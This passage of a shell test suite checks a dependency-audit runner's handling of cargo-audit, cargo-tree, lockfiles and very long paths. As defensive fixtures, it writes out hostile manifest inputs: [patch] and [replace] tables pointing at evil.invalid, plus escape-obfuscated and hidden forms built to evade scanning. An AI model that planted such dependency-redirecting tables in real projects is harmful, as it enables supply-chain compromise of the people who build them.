# package and audit_1 (exec-mode native). Its components of 200 bytes stop while 2 to 202 bytes are left, so
# the last one, of 1 to 201 bytes, makes up the rest whatever the length of $T; it fails when $T leaves less.
deep_wt() {
  local cur c
  mkdir "$T/deep-$1" && cd "$T/deep-$1" || return 1
  cur=$(pwd -P)
  while [ $(( ${#cur} + 202 )) -lt "$1" ]; do
    c=d$(long 199 0); mkdir "$c" && cd "$c" || return 1; cur=$(pwd -P)
  done
  [ $(( $1 - ${#cur} )) -ge 2 ] || return 1
  c=e$(long $(( $1 - ${#cur} - 2 )) 0); mkdir "$c" && cd "$c" || return 1
  printf '[package]\nname = "demo"\nversion = "0.1.0"\nedition = "2021"\n' > Cargo.toml
  mkdir src audit_1 && printf '// v1\n' > src/lib.rs && printf '*\n' > audit_1/.gitignore && printf 'native\n' > audit_1/exec-mode
  pwd -P
}
# 202 lengths in a row give the last component each of the sizes a length of $T can leave it.
dlen=$(( ${#T} + 220 )) dbad=
while [ "$dlen" -lt $(( ${#T} + 422 )) ]; do
  DW=$(deep_wt "$dlen") && [ "${#DW}" = "$dlen" ] || dbad="$dlen bytes asked, ${#DW} made"
  rm -rf "$T/deep-$dlen"; [ -z "$dbad" ] || break; dlen=$((dlen + 1))
done
if [ -z "$dbad" ]; then ok "deep_wt makes a working directory of each of 202 lengths in a row"
else ko "deep_wt makes a working directory of each of 202 lengths in a row: $dbad below $T"; fi
if DW=$(deep_wt $((PM - 22))) && [ "${#DW}" = $((PM - 22)) ]; then
  ( cd "$DW" && mkdir incident_1 && printf '*\n' > incident_1/.gitignore && printf '%s\n' "$SCJ" > incident_1/INCIDENTS.json )
  run "$TARGET" "$DW" -- cargo-test --run audit_1 --src .
  check "natively, in a working directory of $((PM - 22)) bytes, an incident_1/INCIDENTS.json past PATH_MAX ($PM) stops audit_1's build: exit 3, nothing copied" \
    sh -c "[ '$RC' = 3 ] && grep -qxF 'target: blocker: incident_1/INCIDENTS.json cannot be read: $XREAD' '$T/err' && [ ! -s '$T/calls' ] && [ -z \"\$(ls -A '$NT')\" ]"
else
  ko "no working directory of $((PM - 22)) bytes could be made below $T"
fi
if DW=$(deep_wt $((PM - 200))) && [ "${#DW}" = $((PM - 200)) ]; then
  n2=incident_1.$(long 179 x)
  n3=incident_1.$(long 219 y)
  ( cd "$DW" && mkdir "$n2" && printf '%s\n' "$SCJ" > "$n2/INCIDENTS.json" )
  run "$TARGET" "$DW" -- cargo-test --run audit_1 --src .
  check "natively, a run moved aside under a name of 190 bytes, its INCIDENTS.json past PATH_MAX, is passed over: exit 0" \
    sh -c "[ '$RC' = 0 ] && grep -q '^== cargo test' '$T/calls'"
  ( cd "$DW" && mv "$n2" "$n3" )
  run "$TARGET" "$DW" -- cargo-test --run audit_1 --src .
  check "... and under a name of 230 bytes, the run itself past PATH_MAX: exit 0" sh -c "[ '$RC' = 0 ] && grep -q '^== cargo test' '$T/calls'"
  ( cd "$DW" && rm -rf "$n3" )
  run "$TARGET" "$DW" -- cargo-test --run audit_1 --src .
  check "... and with that run gone the same build runs: exit 0" test "$RC" = 0
  run "$TARGET" "$DW" PATH="$T/fake:$T/sys-nopy" -- cargo-test --run audit_1 --src .
  check "natively without python3 and with no incident_* directory, target.sh's own need of python3 stops it: exit 3, nothing copied" \
    sh -c "[ '$RC' = 3 ] && grep -qxF 'target: blocker: python3 is not on PATH, so cargo-test cannot run here — nothing was copied or built.' '$T/err' && [ -z \"\$(ls -A '$NT')\" ]"
  for spelled in INCIDENT_2 Incident_2; do
    ( cd "$DW" && mkdir "$spelled" && printf '%s\n' "$SCJ" > "$spelled/INCIDENTS.json" )
    run "$TARGET" "$DW" -- cargo-test --run audit_1 --src .
    ( cd "$DW" && rm -rf "$spelled" )
    check "natively, a directory spelled $spelled whose INCIDENTS.json records a supply_chain_or_ci incident is passed over: exit 0, with the note" \
      sh -c "[ '$RC' = 0 ] && grep -qxF '$PASSED $spelled/INCIDENTS.json (Rule 11a)' '$T/out'"
  done
  if [ "$(id -u)" != 0 ]; then
    ( cd "$DW" && cp Cargo.toml src/ && mkdir incident_1 && printf '%s\n' "$SCJ" > incident_1/INCIDENTS.json )
    chmod 300 "$DW"
    run "$TARGET" "$DW" -- cargo-test --run audit_1 --src src
    chmod 700 "$DW"
    check "natively, a working directory that cannot be listed stops audit_1's build of --src src: exit 3, nothing copied" \
      sh -c "[ '$RC' = 3 ] && grep -qxF 'target: blocker: $XLIST' '$T/err' && [ ! -s '$T/calls' ]"
    ( cd "$DW" && rm -rf incident_1 )
    run "$TARGET" "$DW" -- cargo-test --run audit_1 --src src
    check "... and with it listed and incident_1 gone, the same build of --src src runs: exit 0" test "$RC" = 0
  fi
else
  ko "no working directory of $((PM - 200)) bytes could be made below $T"
fi
rm -rf "$WT/incident_2" "$WT/incident_notes.md" "$T/deep-$((PM - 22))" "$T/deep-$((PM - 200))"
rm -f "$IJ" "$WT/incident_1/exec-mode" "$WT/incident_1/patches/INC-1.1.patch" "$WT/incident_1/patches/INC-1.2.patch"

# =================================================================================================
# deps.sh: the cargo and npm audits, on copies of the named files only.
# =================================================================================================
DT=$WT/audit_1/disclosures.tsv
rows() { if [ -f "$DT" ]; then echo $(( $(wc -l < "$DT") - 1 )); else echo 0; fi; }
printf '    Scanning Cargo.lock for vulnerabilities (1 crate dependencies)\n' > "$T/audit-clean.txt"
printf 'Crate:     smallvec\nID:        RUSTSEC-2021-0003\n\nerror: 1 vulnerability found!\n' > "$T/audit-vuln.txt"
printf 'error: error loading advisory database: not found\n' > "$T/audit-nodb.txt"
settings FAKE_AUDIT_OUT="$T/audit-clean.txt"
r0=$(rows)
run "$DEPS" "$WT" "${CANARIES[@]}" HTTPS_PROXY="$PROXY" -- cargo-audit --run audit_1 --manifest Cargo.lock
check "cargo-audit: exit 0, and the last line names the output" sh -c "[ '$RC' = 0 ] && [ \"\$(sed -n '\$p' '$T/out')\" = '>> cargo-audit: no vulnerability found (exit 0): audit_1/deps/cargo-audit-1.txt' ]"
check "cargo-audit: rustup's default, then cargo audit --color never" calls_are "rustup default|cargo audit --color never|"
check "... in a copy that holds the lockfile alone, outside the working directory" \
  sh -c "awk '/^== cargo audit/{on=1;next} /^== /{on=0} on' '$T/calls' > '$T/blk' && grep -qxF 'files: Cargo.lock ' '$T/blk' && grep -qxF 'cwd: $S/w' '$T/blk'"
check "... with the proxy, a throwaway HOME, and no canary" \
  sh -c "grep -qxF 'env: HTTPS_PROXY=$PROXY' '$T/blk' && grep -qxF 'home: $S/home' '$T/blk' && ! grep -q canary '$T/calls'"
check "... its output kept" grep -q 'Scanning Cargo.lock' "$WT/audit_1/deps/cargo-audit-1.txt"
check "... and two disclosure rows: the RustSec database from github.com, the lockfile's names to crates.io" \
  sh -c "[ \$(( \$(wc -l < '$DT') - 1 - $r0 )) = 2 ] && grep -q \"	scripts/runner/deps.sh	github.com	advisory database (git fetch of the RustSec database): https://github.com/RustSec/advisory-db	1\$\" '$DT' && grep -q \"	scripts/runner/deps.sh	crates.io	every crates.io package name in this lockfile (cargo audit's check for yanked releases, the crates.io index): Cargo.lock	1\$\" '$DT'"
check "the disclosure file starts with its header, and each row has five cells and a UTC time" \
  sh -c "[ \"\$(sed -n 1p '$DT')\" = \"\$(printf 'time\\ttool\\tservice\\tsent\\tcount')\" ] && ! sed -n '2,\$p' '$DT' | grep -vE '^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}Z	[^	]+	[^	]+	[^	]+	[0-9]+\$' | grep -q ."
r0=$(rows)
run "$DEPS" "$WT" -- cargo-audit --run audit_1 --manifest Cargo.lock --no-fetch
r1=$(rows)
check "cargo-audit --no-fetch: --no-fetch --no-yanked, and nothing disclosed" \
  sh -c "[ '$RC' = 0 ] && grep -qx '== cargo audit --color never --no-fetch --no-yanked' '$T/calls' && [ '$r1' = '$r0' ]"
# cargo-audit reads the lockfile itself, so it gets the lockfile check too: when it asks a registry which
# releases were yanked, a lockfile naming a registry other than crates.io stops the run in strict mode before
# anything is sent; otherwise cargo audit runs without that check (--no-yanked), with a note, and crates.io gets
# no row. Offline (--no-fetch) such a lockfile is audited. Git sources pass either way. An escape, or text that
# is not UTF-8, stops the run in strict mode; otherwise it is audited without the yanked check, with a note.
mkdir -p "$WT/la"
for lock in 'sparse+https://evil.invalid/' 'registry+https://evil.invalid/index'; do
  printf 'version = 3\n\n[[package]]\nname = "anyhow"\nversion = "1.0.0"\nsource = "%s"\nchecksum = "00"\n' "$lock" > "$WT/la/Cargo.lock"
  r0=$(rows)
  run "$DEPS" "$WT" AUDITOR_STRICT=1 -- cargo-audit --run audit_1 --manifest la/Cargo.lock
  check "strict mode, cargo-audit of a lockfile naming the registry $lock: exit 3 before cargo audit runs, nothing disclosed" \
    sh -c "[ '$RC' = 3 ] && grep -q '^deps: blocker: the lockfile names a registry other than crates.io, $lock, which a check for yanked releases could ask; --no-fetch audits it offline' '$T/err' &&
      ! grep -q '^== cargo audit' '$T/calls' && [ \"\$(( \$(wc -l < '$DT') - 1 ))\" = '$r0' ]"
  run "$DEPS" "$WT" -- cargo-audit --run audit_1 --manifest la/Cargo.lock
  r1=$(rows)
  check "cargo-audit of that lockfile: exit 0, cargo audit runs with --no-yanked, a note says why, and only github.com is disclosed" \
    sh -c "[ '$RC' = 0 ] && grep -qx '== cargo audit --color never --no-yanked' '$T/calls' && grep -qxF '>> note: the lockfile names a registry other than crates.io ($lock), so cargo audit ran without its yanked check, which would ask that registry; strict mode stops here (Rule 11f)' '$T/out' && [ \$(( $r1 - $r0 )) = 1 ] && sed -n '\$p' '$DT' | grep -q '	github.com	'"
  check "... and the note is in its output too" \
    sh -c "grep -qxF '>> note: the lockfile names a registry other than crates.io ($lock), so cargo audit ran without its yanked check, which would ask that registry; strict mode stops here (Rule 11f)' \"$WT/\$(sed -n 's/^>> cargo-audit: .*: \\(audit_1\\/deps\\/cargo-audit-[0-9]*[.]txt\\)\$/\\1/p' '$T/out')\""
  for strict in "" 1; do
    run "$DEPS" "$WT" ${strict:+AUDITOR_STRICT=1} -- cargo-audit --run audit_1 --manifest la/Cargo.lock --no-fetch
    check "... and with --no-fetch it is audited offline${strict:+ in strict mode too}, exit 0, with no note" \
      sh -c "[ '$RC' = 0 ] && grep -qx '== cargo audit --color never --no-fetch --no-yanked' '$T/calls' && ! grep -q 'note:' '$T/out'"
  done
done
printf 'version = 3\n\n[[package]]\nname = "anchor-lang"\nversion = "0.30.1"\nsource = "git+https://github.com/coral-xyz/anchor?rev=0123#0123"\n\n[[patch.unused]]\nname = "x"\nversion = "1.0.0"\nsource = "git+https://evil.invalid/x#0123"\n' > "$WT/la/Cargo.lock"
run "$DEPS" "$WT" -- cargo-audit --run audit_1 --manifest la/Cargo.lock
check "cargo-audit of a lockfile with git sources and [[patch.unused]] runs, exit 0" sh -c "[ '$RC' = 0 ] && grep -qx '== cargo audit --color never' '$T/calls'"
ESC='the lockfile has a \u, \U or \x escape, which cargo never writes; deps.sh does not read one'
for shape in escape latin1; do
  if [ "$shape" = escape ]; then
    printf 'version = 3\n\n[[package]]\nname = "anyhow"\nversion = "1.0.0"\n"\\u0073ource" = "sparse+https://evil.invalid/"\n' > "$WT/la/Cargo.lock"
    why=$ESC
  else
    printf 'version = 3\n# caf\351\n' > "$WT/la/Cargo.lock"
    why='la/Cargo.lock is not UTF-8 text'
  fi
  for flag in "" --no-fetch; do
    run "$DEPS" "$WT" AUDITOR_STRICT=1 -- cargo-audit --run audit_1 --manifest la/Cargo.lock $flag
    check "strict mode, cargo-audit ${flag:-with fetching} of a lockfile with $shape text: exit 3, cargo audit never runs" \
      sh -c "[ '$RC' = 3 ] && grep -qF 'deps: blocker: $why; output ' '$T/err' && ! grep -q '^== cargo audit' '$T/calls'"
  done
  run "$DEPS" "$WT" -- cargo-audit --run audit_1 --manifest la/Cargo.lock
  check "cargo-audit of that lockfile, fetching: exit 0, with --no-yanked and a note" \
    sh -c "[ '$RC' = 0 ] && grep -qx '== cargo audit --color never --no-yanked' '$T/calls' && grep -qxF '>> note: $why, so cargo audit ran without its yanked check, which could ask a registry the lockfile names; strict mode stops here (Rule 11f)' '$T/out'"
  run "$DEPS" "$WT" -- cargo-audit --run audit_1 --manifest la/Cargo.lock --no-fetch
  check "... and with --no-fetch: exit 0, audited offline, and a note" \
    sh -c "[ '$RC' = 0 ] && grep -qx '== cargo audit --color never --no-fetch --no-yanked' '$T/calls' && grep -qxF '>> note: $why; cargo audit ran offline (--no-fetch), so it asks no registry; strict mode stops here (Rule 11f)' '$T/out'"
done
settings FAKE_AUDIT_OUT="$T/audit-vuln.txt" FAKE_AUDIT_RC=1
run "$DEPS" "$WT" -- cargo-audit --run audit_1 --manifest Cargo.lock
check "cargo-audit with a vulnerability: exit 1" sh -c "[ '$RC' = 1 ] && grep -q '^>> cargo-audit: vulnerabilities found (exit 1): audit_1/deps/cargo-audit-[0-9]*[.]txt\$' '$T/out'"
settings FAKE_AUDIT_OUT="$T/audit-nodb.txt" FAKE_AUDIT_RC=1
run "$DEPS" "$WT" -- cargo-audit --run audit_1 --manifest Cargo.lock
check "cargo-audit without its database: exit 3, not a finding" sh -c "[ '$RC' = 3 ] && grep -q '^deps: blocker: cargo audit failed (exit 1): no advisory database, or a lockfile it cannot read; output audit_1/deps/cargo-audit-' '$T/err'"
settings FAKE_SLEEP=30
run "$DEPS" "$WT" AUDITOR_RUN_TIMEOUT=2 -- cargo-audit --run audit_1 --manifest Cargo.lock --no-fetch
check "AUDITOR_RUN_TIMEOUT bounds a deps.sh run" sh -c "[ '$RC' = 3 ] && grep -q '^deps: blocker: cargo audit stopped: it passed the 2-second limit (AUDITOR_RUN_TIMEOUT) and was killed' '$T/err'"
settings
mkdir -p "$T/fake-noaudit"
for f in "$T/fake/"*; do case "${f##*/}" in cargo-audit|settings) ;; *) ln -s "$f" "$T/fake-noaudit/${f##*/}" ;; esac; done
run "$DEPS" "$WT" PATH="$T/fake-noaudit:$T/sys" -- cargo-audit --run audit_1 --manifest Cargo.lock
check "cargo-audit where cargo-audit is not installed: exit 3, nothing copied or sent" \
  sh -c "[ '$RC' = 3 ] && grep -qxF 'deps: blocker: cargo-audit is not on PATH, so cargo-audit cannot run here — nothing was copied or sent.' '$T/err' && [ -z \"\$(ls -A '$NT')\" ]"
python3 -I -c 'import sys
with open(sys.argv[1], "w") as f:
    f.write("version = 3\n")
    for i in range(3000):
        f.write("\n[[package]]\nname = \"crate%d\"\nversion = \"1.0.%d\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n" % (i, i))' "$WT/sub/Cargo.lock"
settings FAKE_AUDIT_OUT=Cargo.lock
run "$DEPS" "$WT" -- cargo-audit --run audit_1 --manifest sub/Cargo.lock --no-fetch
n=$(sed -n 's/.*cargo-audit-\([0-9]*\)[.]txt$/\1/p' "$T/out")
check "a lockfile of $(wc -c < "$WT/sub/Cargo.lock" | tr -d ' ') bytes is copied whole (cargo audit prints the copy here)" \
  sh -c "[ '$RC' = 0 ] && tail -c +\$(( \$(wc -c < '$WT/audit_1/deps/cargo-audit-$n.txt') - \$(wc -c < '$WT/sub/Cargo.lock') + 1 )) '$WT/audit_1/deps/cargo-audit-$n.txt' | cmp -s - '$WT/sub/Cargo.lock'"
settings

# cargo-tree and cargo-outdated: metadata on the copy, then the manifests rebuilt and cargo run on them.
# $WT/pkg is a crate with a crates.io dependency, a [profile] and a [workspace.metadata] table (neither a
# host-steering vector, but tables the rebuild must drop), and a Cargo.lock.
mkdir -p "$WT/pkg/src"
# The copy carries a [profile] and a [workspace.metadata] table (neither surfaces in metadata), so the dump
# of the manifest cargo actually ran on proves it is the metadata-derived rebuild, not the copy.
PKG_TOML='[package]\nname = "pkg"\nversion = "0.4.0"\nedition = "2021"\n\n[dependencies]\nanyhow = "1.2"\n\n[profile.release]\nopt-level = 3\n\n[workspace.metadata.x]\ny = 1\n'
printf '%b' "$PKG_TOML" > "$WT/pkg/Cargo.toml"
: > "$WT/pkg/src/lib.rs"
printf 'version = 3\n\n[[package]]\nname = "anyhow"\nversion = "1.2.0"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\nchecksum = "00"\n\n[[package]]\nname = "pkg"\nversion = "0.4.0"\ndependencies = ["anyhow"]\n' > "$WT/pkg/Cargo.lock"
ANYHOW_DEP='{"name":"anyhow","req":"^1.2","source":"registry+https://github.com/rust-lang/crates.io-index","kind":null,"optional":false,"uses_default_features":true,"features":[],"target":null,"rename":null}'
settings SHIM_DUMP=1 FAKE_META_DEP="$ANYHOW_DEP"
r0=$(rows)
run "$DEPS" "$WT" HTTPS_PROXY="$PROXY" -- cargo-tree --run audit_1 --manifest pkg/Cargo.toml --manifest pkg/Cargo.lock
headers > "$T/hdrs"
check "cargo-tree: metadata on the copy, then cargo tree on the rebuilt manifest, never the copy" sh -c "
  grep -qx 'rustup default' '$T/hdrs' &&
  grep -qx 'cargo metadata --no-deps --format-version 1 --offline --manifest-path $S/w/pkg/Cargo.toml' '$T/hdrs' &&
  grep -qE '^cargo tree --workspace --color never --manifest-path $S/rebuilt/.*Cargo.toml\$' '$T/hdrs' &&
  ! grep -qE '^cargo (tree|outdated).*--manifest-path $S/w/' '$T/hdrs'"
check "... the rebuilt manifest keeps the crates.io dependency and holds no table the copy had" sh -c "
  grep -qxF 'rebuilt| anyhow = { version = \"^1.2\" }' '$T/calls' &&
  grep -qxF 'rebuilt| [dependencies]' '$T/calls' &&
  ! grep -qiE 'rebuilt[|].*(patch|replace|profile|metadata)' '$T/calls'"
check "... the metadata read is offline, without the proxy" none_in_blocks '^== cargo metadata' '^env: [A-Za-z_]*[Pp][Rr][Oo][Xx][Yy]='
check "... the tree step got the proxy and the git that refuses fetches" \
  sh -c "awk '/^== cargo tree/{on=1;next} /^== /{on=0} on' '$T/calls' > '$T/blk' && grep -qxF 'git: $S/nogit/git deps.sh: git sources are not fetched' '$T/blk' && grep -qxF 'env: CARGO_NET_GIT_FETCH_WITH_CLI=true' '$T/blk' && grep -qxF 'env: HTTPS_PROXY=$PROXY' '$T/blk'"
check "... and one disclosure row naming the manifests" \
  sh -c "[ \$(( \$(wc -l < '$DT') - 1 - $r0 )) = 1 ] && sed -n '\$p' '$DT' | grep -q '	crates.io	the crate names and version requirements in these manifests (cargo-tree resolves them with the crates.io index and downloads): pkg/Cargo.toml pkg/Cargo.lock	2\$'"
check "... exit 0, the dependency tree from the rebuilt manifests" sh -c "[ '$RC' = 0 ] && grep -q '^>> cargo-tree: the dependency tree, from the rebuilt manifests (exit 0): ' '$T/out'"
# S2: a dependency literally named patch or replace must resolve, not be refused.
printf '[package]\nname = "dp"\nversion = "0.1.0"\nedition = "2021"\n\n[dependencies]\npatch = "1.0"\nreplace = "0.1"\n' > "$WT/pkg/Cargo.toml"
PATCH_DEPS='[{"name":"patch","req":"^1.0","source":"registry+https://github.com/rust-lang/crates.io-index","kind":null,"optional":false,"uses_default_features":true,"features":[],"target":null,"rename":null},{"name":"replace","req":"^0.1","source":"registry+https://github.com/rust-lang/crates.io-index","kind":null,"optional":false,"uses_default_features":true,"features":[],"target":null,"rename":null}]'
settings SHIM_DUMP=1 FAKE_META_DEP="$PATCH_DEPS"
run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest pkg/Cargo.toml
check "a dependency named patch/replace resolves (not refused as a patch table)" sh -c "
  [ '$RC' = 0 ] && grep -qxF 'rebuilt| patch = { version = \"^1.0\" }' '$T/calls' && grep -qxF 'rebuilt| replace = { version = \"^0.1\" }' '$T/calls'"
settings
# The stub targets still follow the manifest for the metadata read, and a target path outside its directory refuses.
mkdir -p "$WT/stubs"
printf '[package]\nname = "stubs"\nversion = "0.1.0"\nedition = "2021"\nbuild = "build.rs"\n\n[lib]\npath = "lib/main.rs"\n\n[[bin]]\nname = "tool"\n\n[[test]]\nname = "it"\npath = "checks/it.rs"\n' > "$WT/stubs/Cargo.toml"
run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest stubs/Cargo.toml
headers > "$T/hdrs"
check "the stub targets let metadata parse a manifest with a lib path, build script, bin and test" \
  sh -c "[ '$RC' = 0 ] && grep -q '^cargo metadata ' '$T/hdrs'"
printf '[package]\nname = "out"\nversion = "0.1.0"\nedition = "2021"\n\n[lib]\npath = "../../outside.rs"\n' > "$WT/stubs/Cargo.toml"
run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest stubs/Cargo.toml
check "a target path outside the manifest's directory: exit 3, cargo never runs" \
  sh -c "[ '$RC' = 3 ] && grep -q '^deps: blocker: stubs/Cargo.toml names a target outside its directory: ../../outside.rs' '$T/err' && ! grep -q '^== cargo' '$T/calls'"
# A [patch]/[replace] table spelled as no Cargo.toml needs is refused by the second line, before cargo runs.
# Each form is placed before [package], so a header form defines a top-level [patch]/[replace] table and a
# root key is a genuine top-level key (after [package] a dotted patch key would belong to [package]).
while IFS='|' read -r form rest; do
  [ -n "$form" ] || continue
  { printf '%s\n' "$form"; [ -z "$rest" ] || printf '%s\n' "$rest"; printf '[package]\nname = "pt"\nversion = "0.1.0"\nedition = "2021"\n'; } > "$WT/stubs/Cargo.toml"
  r0=$(rows)
  run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest stubs/Cargo.toml
  label=$(printf '%s' "$form" | cut -c1-36)
  check "a [patch]/[replace] table as '$label': exit 3, cargo never runs, nothing disclosed" sh -c "
    [ '$RC' = 3 ] && grep -qE '^deps: blocker: stubs/Cargo.toml (holds an array of |spells a .patch. or .replace. table header with a quoted key|has a .patch. or .replace. table header deps.sh does not read|sets a root |has a table header with a |has a key before its first table header)' '$T/err' &&
    ! grep -q '^== cargo' '$T/calls' && [ \"\$(( \$(wc -l < '$DT') - 1 ))\" = '$r0' ]"
done <<'FORMS'
["patch".crates-io]|serde = { git = "https://evil.invalid/serde" }
['patch'.crates-io]|serde = {}
[ "replace" ]|"serde:1.0.0" = { path = "/tmp" }
["patch" . crates-io]|serde = {}
patch.crates-io.serde = { registry-index = "sparse+https://evil.invalid/" }|
"patch".crates-io.serde = { git = "https://evil.invalid/x" }|
patch = { crates-io = { serde = { git = "https://evil.invalid/x" } } }|
["\u0070atch".crates-io]|serde = { git = "https://evil.invalid/x" }
["\U00000072eplace"]|"serde:1.0.0" = { path = "/tmp" }
[[patch.crates-io]]|name = "serde"
"\u0070atch".crates-io.serde = { git = "https://evil.invalid/x" }|
[patch]|crates-io.serde = { git = "https://evil.invalid/x" }
[patch.crates-io.serde.extra]|x = 1
FORMS
# A multi-line string before the first table header can hide a root key from a line scan (cargo reads the
# patch below as a root key); the second line refuses anything there but comments and cargo-features.
printf 'x = """\n[package]\n"""\npatch = { crates-io = { serde = { git = "https://evil.invalid/x" } } }\n[package]\nname = "ms"\nversion = "0.1.0"\nedition = "2021"\n' > "$WT/stubs/Cargo.toml"
r0=$(rows)
run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest stubs/Cargo.toml
check "a root key hidden after a multi-line string: exit 3, cargo never runs, nothing disclosed" sh -c "
  [ '$RC' = 3 ] && grep -q '^deps: blocker: stubs/Cargo.toml has a key before its first table header' '$T/err' &&
  ! grep -q '^== cargo' '$T/calls' && [ \"\$(( \$(wc -l < '$DT') - 1 ))\" = '$r0' ]"
# A manifest whose first line is cargo-features, the one key a Cargo.toml has before its first table header.
printf 'cargo-features = ["edition2024"]\n[package]\nname = "cf"\nversion = "0.1.0"\nedition = "2021"\n' > "$WT/stubs/Cargo.toml"
run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest stubs/Cargo.toml
check "a manifest starting with cargo-features = [\"edition2024\"] runs" sh -c "[ '$RC' = 0 ] && grep -q '^== cargo tree ' '$T/calls'"
# A plainly spelled [patch] or [replace] table runs: the rebuilt tree leaves it out, and one note, on stderr
# and in the kept output, names the crates it patches (names that match the crate grammar, at most 20), never
# a value. The vendoring idiom first, with its lockfile (a path package has no source line).
mkdir -p "$WT/pv/vendor/solana-program"
printf '[package]\nname = "pv"\nversion = "0.1.0"\nedition = "2021"\n\n[dependencies]\nsolana-program = "1.18"\n\n[patch.crates-io]\nsolana-program = { path = "vendor/solana-program" }\n' > "$WT/pv/Cargo.toml"
printf '[package]\nname = "solana-program"\nversion = "1.18.26"\nedition = "2021"\n' > "$WT/pv/vendor/solana-program/Cargo.toml"
printf 'version = 3\n\n[[package]]\nname = "pv"\nversion = "0.1.0"\ndependencies = ["solana-program"]\n\n[[package]]\nname = "solana-program"\nversion = "1.18.26"\n' > "$WT/pv/Cargo.lock"
NOTE_PV='>> note: pv/Cargo.toml holds a [patch] or [replace] table, which this tree does not apply: solana-program'
settings SHIM_DUMP=1
run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest pv/Cargo.toml --manifest pv/Cargo.lock
headers > "$T/hdrs"
kept=$(sed -n 's/^>> cargo-tree: .*: \(audit_1\/deps\/cargo-tree-[0-9]*[.]txt\)$/\1/p' "$T/out")
check "the vendoring idiom ([patch.crates-io] with a path) runs on the rebuilt manifest, exit 0" sh -c "
  [ '$RC' = 0 ] && grep -qE '^cargo tree --workspace --color never --manifest-path $S/rebuilt/.*Cargo.toml\$' '$T/hdrs' &&
  ! grep -qiE 'rebuilt[|].*(patch|vendor)' '$T/calls'"
check "... with one note on stderr, and the same note in the kept output" sh -c "
  [ \"\$(cat '$T/err')\" = '$NOTE_PV' ] && [ -n '$kept' ] && grep -qxF '$NOTE_PV' '$WT/$kept'"
# git and registry-index entries, and the URL-keyed and [replace] forms: they run, the note names the crates,
# and no value reaches the note or the rebuilt manifest cargo runs on.
printf '[package]\nname = "pg"\nversion = "0.1.0"\nedition = "2021"\n\n[dependencies]\nanyhow = "1"\n\n[patch.crates-io]\nserde = { git = "https://evil.invalid/serde" }\nanyhow = { version = "1", registry-index = "sparse+https://evil.invalid/" }\n\n[patch."https://evil.invalid/git-source"]\nlibc = { path = "evil-path" }\n\n[replace]\n"rand:0.8.5" = { git = "https://evil.invalid/rand" }\n' > "$WT/pv/Cargo.toml"
r0=$(rows)
run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest pv/Cargo.toml
kept=$(sed -n 's/^>> cargo-tree: .*: \(audit_1\/deps\/cargo-tree-[0-9]*[.]txt\)$/\1/p' "$T/out")
check "[patch] entries with git and registry-index, a URL-keyed [patch] and [replace] run, exit 0, cargo told of nothing but crates.io" sh -c "
  [ '$RC' = 0 ] && grep -q '^== cargo tree ' '$T/calls' && ! grep -qiE 'rebuilt[|].*(evil|patch|replace)' '$T/calls' &&
  [ \$(( \$(wc -l < '$DT') - 1 - $r0 )) = 1 ] && sed -n '\$p' '$DT' | grep -q '	crates.io	'"
check "... and the note names serde, anyhow, libc and rand, but no path, URL or registry" sh -c "
  [ \"\$(cat '$T/err')\" = '>> note: pv/Cargo.toml holds a [patch] or [replace] table, which this tree does not apply: serde, anyhow, libc, rand' ] &&
  grep -qxF '>> note: pv/Cargo.toml holds a [patch] or [replace] table, which this tree does not apply: serde, anyhow, libc, rand' '$WT/$kept' &&
  ! grep -qE 'evil|https|path' '$T/err'"
# A name outside the crate grammar is never printed, and past 20 names the note says how many more.
{ printf '[package]\nname = "pn"\nversion = "0.1.0"\nedition = "2021"\n\n[patch.crates-io]\n"bad name" = { path = "secret-dir/one" }\n"9lead" = { path = "secret-dir/two" }\n'
  i=1; while [ "$i" -le 22 ]; do printf 'c%s = { path = "p" }\n' "$i"; i=$((i + 1)); done; } > "$WT/pv/Cargo.toml"
run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest pv/Cargo.toml
check "a name outside the crate grammar is not printed, and past 20 names the note counts the rest" sh -c "
  [ '$RC' = 0 ] && [ \"\$(cat '$T/err')\" = '>> note: pv/Cargo.toml holds a [patch] or [replace] table, which this tree does not apply: c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11, c12, c13, c14, c15, c16, c17, c18, c19, c20 and 4 more' ] &&
  ! grep -qE 'bad name|9lead|secret-dir' '$T/err'"
printf '[package]\nname = "pn"\nversion = "0.1.0"\nedition = "2021"\n\n[patch.crates-io]\n"bad name" = { path = "secret-dir/one" }\n' > "$WT/pv/Cargo.toml"
run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest pv/Cargo.toml
check "... and with no printable name the note only counts the entries" sh -c "
  [ '$RC' = 0 ] && [ \"\$(cat '$T/err')\" = '>> note: pv/Cargo.toml holds a [patch] or [replace] table, which this tree does not apply: 1 entry whose name is not printed' ]"
settings
# What the second line must not refuse: a byte-order mark, a comment and a one-line cargo-features before the
# first header, a cfg target header with escaped quotes, and dependency keys named, or escaped to, patch.
printf '\357\273\277# a comment\n\ncargo-features = ["edition2024"]\n[package]\nname = "ok"\nversion = "0.1.0"\nedition = "2021"\n[target."cfg(target_os = \\"linux\\")".dependencies]\nlibc = "0.2"\n[dependencies]\npatch = "1.0"\n"\\u0070atch2" = "1"\n' > "$WT/stubs/Cargo.toml"
run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest stubs/Cargo.toml
check "the second line passes a BOM, comments, cargo-features, an escaped-quote cfg header and keys named patch" \
  sh -c "[ '$RC' = 0 ] && grep -q '^== cargo tree ' '$T/calls'"
# A lockfile's git and other-registry sources and its [[patch.unused]] entries, as a git- or registry-index
# [patch] leaves them, do not stop cargo-tree: cargo resolves the rebuilt workspace from crates.io and fetches
# none of them, and the rebuilt manifest cargo runs on names none of them.
printf '[package]\nname = "lp"\nversion = "0.1.0"\nedition = "2021"\n[dependencies]\nanyhow = "1"\n' > "$WT/stubs/Cargo.toml"
settings SHIM_DUMP=1
for lock in 'git+https://evil.invalid/x#0123' 'sparse+https://evil.invalid/' 'registry+https://evil.invalid/index'; do
